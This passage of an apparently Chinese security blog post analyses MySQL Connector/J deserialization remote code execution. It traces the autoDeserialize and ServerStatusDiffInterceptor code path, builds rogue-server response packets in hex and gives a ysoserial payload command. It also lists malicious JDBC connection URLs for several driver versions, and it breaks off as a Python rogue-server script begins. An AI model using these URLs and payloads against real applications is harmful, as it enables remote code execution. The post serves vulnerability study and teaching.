alt="image-20240521010043116"></p><p>然后取出压缩包里面的jar包，导到项目中，这里新建一个lib文件夹用来存放jar包</p><p><img src="/blog/2024/05/21/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240521010346883.png" alt="image-20240521010346883"></p><p>（也可以直接右键jar包添加为库）</p><hr><h2 id="简单demo"><a href="#简单demo" class="headerlink" title="简单demo"></a>简单demo</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> <span class="token class-name">Driver</span> <span class="token operator">=</span> <span class="token string">"com.mysql.cj.jdbc.Driver"</span><span class="token punctuation">;</span> <span class="token comment">// 从mysql-connector-java 6开始</span>        <span class="token comment">//String Driver = "com.mysql.jdbc.Driver"; // mysql-connector-java 5</span>        <span class="token class-name">String</span> <span class="token constant">DB_URL</span> <span class="token operator">=</span> <span class="token string">"jdbc:mysql://127.0.0.1:3306/sql?useSSL=true&amp;serverTimezone=GMT%2B8"</span><span class="token punctuation">;</span><span class="token comment">// 注意高版本mysql服务需要指定useSSL参数，高版本jdbc jar包需要指定serverTimezone时区</span>        <span class="token comment">//1.加载启动</span>        <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token class-name">Driver</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//2.建立连接</span>        <span class="token class-name">Connection</span> conn <span class="token operator">=</span> <span class="token class-name">DriverManager</span><span class="token punctuation">.</span><span class="token function">getConnection</span><span class="token punctuation">(</span><span class="token constant">DB_URL</span><span class="token punctuation">,</span> <span class="token string">"root"</span><span class="token punctuation">,</span> <span class="token string">"passwd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//3.操作数据库，实现增删改查</span>        <span class="token class-name">Statement</span> stmt <span class="token operator">=</span> conn<span class="token punctuation">.</span><span class="token function">createStatement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ResultSet</span> rs <span class="token operator">=</span> stmt<span class="token punctuation">.</span><span class="token function">executeQuery</span><span class="token punctuation">(</span><span class="token string">"select * from user"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//如果有数据，rs.next()返回true</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>rs<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>rs<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" : "</span> <span class="token operator">+</span> rs<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/05/21/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240521011411208.png" alt="image-20240521011411208"></p><hr><h1 id="Java序列化对象的标识符"><a href="#Java序列化对象的标识符" class="headerlink" title="Java序列化对象的标识符"></a>Java序列化对象的标识符</h1><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Car</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Car</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span><span class="token string">"car"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">FileNotFoundException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Car</span> car<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Car</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">FileOutputStream</span> fos <span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"output"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>fos<span class="token punctuation">)</span><span class="token punctuation">;</span>        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>car<span class="token punctuation">)</span><span class="token punctuation">;</span>        oos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行程序输出会得到一个序列化文件</p><p>用010看一下其十六进制</p><p><img src="/blog/2024/05/21/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240521012041561.png" alt="image-20240521012041561"></p><p><img src="/blog/2024/05/21/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240521012111477.png" alt="image-20240521012111477"></p><p>前两个字节固定为<code>-84</code>和<code>-19</code>，这一点在后面会回收伏笔</p><hr><h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>若攻击者能控制 JDBC 连接设置项，则可以通过设置其配置指向恶意 MySQL 服务器触发<code>ObjectInputStream.readObject()</code>，构造反序列化利用链从而造成RCE。</p><p>通过 JDBC 连接 MySQL 服务端时，会有几句内置的查询语句需执行，其中两个查询的结果集在 MySQL 客户端进行处理时会被<code>ObjectInputStream.readObject()</code>进行反序列化处理。如果攻击者可以控制 JDBC 连接设置项，那么可以通过设置其配置指向恶意MySQL服务触发MySQL JDBC客户端的反序列化漏洞。可被利用的两条查询语句：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SHOW</span> <span class="token keyword">SESSION</span> <span class="token keyword">STATUS</span><span class="token keyword">SHOW</span> COLLATION<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h2 id="JDBC连接参数"><a href="#JDBC连接参数" class="headerlink" title="JDBC连接参数"></a>JDBC连接参数</h2><p>即 jdbc 的url中的参数，例如<code>jdbc:mysql://127.0.0.1:3306/sql?useSSL=true&amp;serverTimezone=GMT%2B8</code>，其中的参数就有 useSSL 和 serverTimezone</p><ul><li><p>statementInterceptors：连接参数是用于指定实现 com.mysql.jdbc.StatementInterceptor  接口的类的逗号分隔列表的参数。这些拦截器可用于通过在查询执行和结果返回之间插入自定义逻辑来影响查询执行的结果，这些拦截器将被添加到一个链中，第一个拦截器返回的结果将被传递到第二个拦截器，以此类推。在 8.0 中被 queryInterceptors 参数替代。</p></li><li><p>queryInterceptors：一个逗号分割的Class列表（实现了com.mysql.cj.interceptors.QueryInterceptor接口的Class），在Query”之间”进行执行来影响结果。（效果上来看是在Query执行前后各插入一次操作）</p></li><li><p>autoDeserialize：自动检测与反序列化存在BLOB字段中的对象。</p></li><li><p>detectCustomCollations：驱动程序是否应该检测服务器上安装的自定义字符集&#x2F;排序规则，如果此选项设置为“true”，驱动程序会在每次建立连接时从服务器获取实际的字符集&#x2F;排序规则。这可能会显着减慢连接初始化速度</p></li></ul><p>文档地址：<a href="https://dev.mysql.com/doc/connector-j/8.0/en/connector-j-connp-props-connection.html#cj-conn-prop_detectCustomCollations">https://dev.mysql.com/doc/connector-j/8.0/en/connector-j-connp-props-connection.html</a></p><hr><h2 id="readObject触发点"><a href="#readObject触发点" class="headerlink" title="readObject触发点"></a>readObject触发点</h2><p>漏洞点在于<code>com.mysql.cj.jdbc.result.ResultSetImpl.getObject()</code></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">getObject</span><span class="token punctuation">(</span><span class="token keyword">int</span> columnIndex<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">SQLException</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">checkRowPos</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">checkColumnBounds</span><span class="token punctuation">(</span>columnIndex<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> columnIndexMinusOne <span class="token operator">=</span> columnIndex <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>thisRow<span class="token punctuation">.</span><span class="token function">getNull</span><span class="token punctuation">(</span>columnIndexMinusOne<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Field</span> field <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>columnDefinition<span class="token punctuation">.</span><span class="token function">getFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>columnIndexMinusOne<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">switch</span> <span class="token punctuation">(</span>field<span class="token punctuation">.</span><span class="token function">getMysqlType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">case</span> <span class="token constant">BIT</span><span class="token operator">:</span><span class="token comment">//判断数据是不是blob或者二进制数据</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>field<span class="token punctuation">.</span><span class="token function">isBinary</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>field<span class="token punctuation">.</span><span class="token function">isBlob</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">return</span> field<span class="token punctuation">.</span><span class="token function">isSingleBit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getBoolean</span><span class="token punctuation">(</span>columnIndex<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span>columnIndex<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> data <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span>columnIndex<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token class-name">Boolean</span><span class="token punctuation">)</span><span class="token keyword">this</span><span class="token punctuation">.</span>connection<span class="token punctuation">.</span><span class="token function">getPropertySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getBooleanProperty</span><span class="token punctuation">(</span><span class="token string">"autoDeserialize"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//获取连接属性的autoDeserialize是否为true，即要求url中autoDeserialize参数需要为true</span>                            <span class="token keyword">return</span> data<span class="token punctuation">;</span>                        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                            <span class="token class-name">Object</span> obj <span class="token operator">=</span> data<span class="token punctuation">;</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span>data <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> data<span class="token punctuation">.</span>length <span class="token operator">>=</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                                <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">84</span> <span class="token operator">||</span> data<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">19</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                                    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span>columnIndex<span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token punctuation">&#125;</span>                                <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                                    <span class="token class-name">ByteArrayInputStream</span> bytesIn <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>                                    <span class="token class-name">ObjectInputStream</span> objIn <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>bytesIn<span class="token punctuation">)</span><span class="token punctuation">;</span>                                    obj <span class="token operator">=</span> objIn<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                    objIn<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                    bytesIn<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token punctuation">&#125;</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/05/21/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240521134323858.png" alt="image-20240521134323858"></p><p>在readObject前有一个判断，那就是<code>if (data[0] != -84 || data[1] != -19)</code>，即前面Java序列化对象的标识符</p><p>那么这个就用来判断是否为序列化对象，如果是的话才能进入readObject方法被调用</p><p>接下来找调用 getObject 方法的地方，在<code>com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor.populateMapWithSessionStatusValues()</code></p><blockquote><p><code>ServerStatusDiffInterceptor</code>是一个拦截器，在JDBC URL中设定属性queryInterceptors为<code>ServerStatusDiffInterceptor</code>时，执行查询语句会调用拦截器的preProcess和postProcess方法</p></blockquote><p><img src="/blog/2024/05/21/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240521135020403.png" alt="image-20240521135020403"></p><p>这里执行<code>ResultSetUtil.resultSetToMap(toPopulate, rs)</code>，ctrl+B 跟进该方法</p><p><img src="/blog/2024/05/21/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240521135132307.png" alt="image-20240521135132307"></p><p>在方法内执行了 getObject 方法，于是连上了</p><p>接下来看看传入的两个参数 toPopulate 和 rs</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">populateMapWithSessionStatusValues</span><span class="token punctuation">(</span><span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">></span></span> toPopulate<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">Statement</span> stmt <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token class-name">ResultSet</span> rs <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            toPopulate<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            stmt <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>connection<span class="token punctuation">.</span><span class="token function">createStatement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            rs <span class="token operator">=</span> stmt<span class="token punctuation">.</span><span class="token function">executeQuery</span><span class="token punctuation">(</span><span class="token string">"SHOW SESSION STATUS"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">ResultSetUtil</span><span class="token punctuation">.</span><span class="token function">resultSetToMap</span><span class="token punctuation">(</span>toPopulate<span class="token punctuation">,</span> rs<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>rs 是服务端执行SQL语句<code>SHOW SESSION STATUS</code>后返回的结果，那么只要我们能利用恶意的mysql服务端来控制rs的值，就可以尝试触发反序列化链了</p><hr><h2 id="MySQL认证报文"><a href="#MySQL认证报文" class="headerlink" title="MySQL认证报文"></a>MySQL认证报文</h2><p>既然需要恶意的mysql服务，那么就得自己写，这里有两种写法：</p><ol><li><p>根据MYSQL的协议去写服务器</p></li><li><p>抓包，模拟发包过程</p></li></ol><p>这里选择第二种</p><p>准备一个客户端：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Client</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">SQLException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> <span class="token class-name">Driver</span> <span class="token operator">=</span> <span class="token string">"com.mysql.cj.jdbc.Driver"</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> <span class="token constant">DB_URL</span> <span class="token operator">=</span> <span class="token string">"jdbc:mysql://127.0.0.1:3306/mysql?characterEncoding=utf8&amp;useSSL=false&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true&amp;serverTimezone=GMT%2B8"</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token class-name">Driver</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Connection</span> conn <span class="token operator">=</span> <span class="token class-name">DriverManager</span><span class="token punctuation">.</span><span class="token function">getConnection</span><span class="token punctuation">(</span><span class="token constant">DB_URL</span><span class="token punctuation">,</span><span class="token string">"root"</span><span class="token punctuation">,</span><span class="token string">"passwd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后抓包：因为使用的是本地的MYSQL，所以抓包需要使用<code>npcap</code>，wireshark默认使用的是<code>winpcap</code>，它不会抓取<code>本地环回</code>的数据包</p><p>懒得配环境了，这里直接拿别的师傅的图（</p><p>mysql也是有类似tcp一样的认证系统的，有Request和Response</p><p>分析<code>Response OK</code>的数据包</p><p><img src="/blog/2024/05/21/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240530113241054.png" alt="image-20240530113241054"></p><p>可以看到MYSQL Protocol的认证报文为：<code>0700000200000002000000</code></p><p>也就是说我们恶意服务端只需要将该数据返回给Request即可完成认证，再看看Request报文：</p><p><img src="/blog/2024/05/21/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240530113435915.png" alt="image-20240530113435915"></p><p>直接发送原始数据即可，恶意服务端可以将这部分改为恶意payload，之后进行反序列化</p><hr><h2 id="show-session-status响应包的编写"><a href="#show-session-status响应包的编写" class="headerlink" title="show session status响应包的编写"></a>show session status响应包的编写</h2><p>从流量中可以看出来<code>show session status</code>属于<strong>request Query</strong> 报文</p><p>对于查询数据包的响应包可以分为四种：错误包（ERR Packet）、正确包（OK Packet）、 Protocol::LOCAL_INFILE_Request、结果集（ProtocolText::Resultset）</p><p>流量里看到的<strong>Response OK</strong>数据包就是<strong>OK packet</strong></p><p>我们这里要用的是<strong>结果集</strong>的数据包，结果集响应包的结构：</p><p><img src="/blog/2024/05/21/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240531005812275.png" alt="image-20240531005812275"></p><ul><li>数据段1：说明下面的结果集有多少列</li><li>数据段2：列的定义</li><li>数据段3：EOF 包</li><li>数据段4：行数据</li></ul><p>那么对着这个数据段结构来构造自己的数据段：</p><ol><li><p>数据段1就可以写成<code>01 00 00 01 02</code> 前三字节表示数据长度为1，然后<code>sequence id</code>为1，最后一字节02表示有两列（尝试写一列无法正常运行）</p></li><li><p>数据段2用其它师傅已经写好的数据：<code>1a000002036465660001630163016301630c3f00ffff0000fcffff000000</code></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token number">1</span>a <span class="token number">00</span> <span class="token number">00</span>  <span class="token comment">// 3字节表示长度（这个长度说的是协议的内容长度，不包括序号那一字节）</span><span class="token number">02</span>      <span class="token comment">// 序号：这里是第二个数据字段</span><span class="token number">03646566</span>  <span class="token comment">// def</span><span class="token number">00</span>   <span class="token comment">// schema协议：因为不使用就用00</span><span class="token number">01</span> <span class="token number">63</span>  <span class="token comment">// table：因为我们使用列数据，就不需要名字了，下面几个都是任意字符。字符串第一字节是用来说明长度的。</span><span class="token number">01</span> <span class="token number">63</span>  <span class="token comment">// org_table：01表示1字节，63是数据</span><span class="token number">0163</span>    <span class="token comment">// name  </span><span class="token number">0163</span>   <span class="token comment">// org_name</span><span class="token number">0</span>c      filler  <span class="token comment">// length of the following fields 总是0x0c</span><span class="token number">3f</span><span class="token number">00</span>   <span class="token comment">// characterset：字符编码，003f是binary </span>ffff0000  column_length <span class="token comment">// 允许数据最大长度，就是我们行数据的最大长度。ffff</span>fc    <span class="token comment">// column_type：这一列数据类型，fc表示blob  </span><span class="token number">9000</span>    <span class="token comment">// flags：9000是官方的值</span><span class="token number">00</span><span class="token comment">// decimals</span><span class="token number">0000</span><span class="token comment">// filler_2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>数据段3，EOF包貌似可以不用写</p></li><li><p>数据段4，即我们的poc，和上面一样，计算出长度（3字节）序号（1字节）行数据（行数据第一个字节是数据的长度）。poc使用ysoserial</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-jar</span> ysoserial.jar CommonsCollections7 <span class="token string">"calc"</span> <span class="token operator">></span> a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><hr><h1 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h1><h2 id="ServerStatusDiffInterceptor链"><a href="#ServerStatusDiffInterceptor链" class="headerlink" title="ServerStatusDiffInterceptor链"></a>ServerStatusDiffInterceptor链</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// 5.1.0-5.1.10 连接后需执行查询</span>jdbc<span class="token operator">:</span>mysql<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token operator">:</span><span class="token number">3306</span><span class="token operator">/</span>test<span class="token operator">?</span>autoDeserialize<span class="token operator">=</span><span class="token boolean">true</span><span class="token operator">&amp;</span>statementInterceptors<span class="token operator">=</span><span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>mysql<span class="token punctuation">.</span>jdbc<span class="token punctuation">.</span>interceptors<span class="token punctuation">.</span></span>ServerStatusDiffInterceptor</span><span class="token operator">&amp;</span>user<span class="token operator">=</span>yso_JRE8u20_calc<span class="token comment">// 5.1.11-5.x.xx</span>jdbc<span class="token operator">:</span>mysql<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token operator">:</span><span class="token number">3306</span><span class="token operator">/</span>test<span class="token operator">?</span>autoDeserialize<span class="token operator">=</span><span class="token boolean">true</span><span class="token operator">&amp;</span>statementInterceptors<span class="token operator">=</span><span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>mysql<span class="token punctuation">.</span>jdbc<span class="token punctuation">.</span>interceptors<span class="token punctuation">.</span></span>ServerStatusDiffInterceptor</span><span class="token operator">&amp;</span>user<span class="token operator">=</span>yso_JRE8u20_calc<span class="token comment">// 6.x（注意包名中添加cj）</span>jdbc<span class="token operator">:</span>mysql<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token operator">:</span><span class="token number">3306</span><span class="token operator">/</span>test<span class="token operator">?</span>autoDeserialize<span class="token operator">=</span><span class="token boolean">true</span><span class="token operator">&amp;</span>statementInterceptors<span class="token operator">=</span><span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>mysql<span class="token punctuation">.</span>cj<span class="token punctuation">.</span>jdbc<span class="token punctuation">.</span>interceptors<span class="token punctuation">.</span></span>ServerStatusDiffInterceptor</span><span class="token operator">&amp;</span>user<span class="token operator">=</span>yso_JRE8u20_calc<span class="token comment">// 8.0.20以下</span>jdbc<span class="token operator">:</span>mysql<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token operator">:</span><span class="token number">3306</span><span class="token operator">/</span>test<span class="token operator">?</span>autoDeserialize<span class="token operator">=</span><span class="token boolean">true</span><span class="token operator">&amp;</span>queryInterceptors<span class="token operator">=</span><span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>mysql<span class="token punctuation">.</span>cj<span class="token punctuation">.</span>jdbc<span class="token punctuation">.</span>interceptors<span class="token punctuation">.</span></span>ServerStatusDiffInterceptor</span><span class="token operator">&amp;</span>user<span class="token operator">=</span>yso_JRE8u20_calc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="8-0-7-8-0-20"><a href="#8-0-7-8-0-20" class="headerlink" title="8.0.7-8.0.20"></a>8.0.7-8.0.20</h3><p>准备一个恶意mysql服务端</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding:utf-8 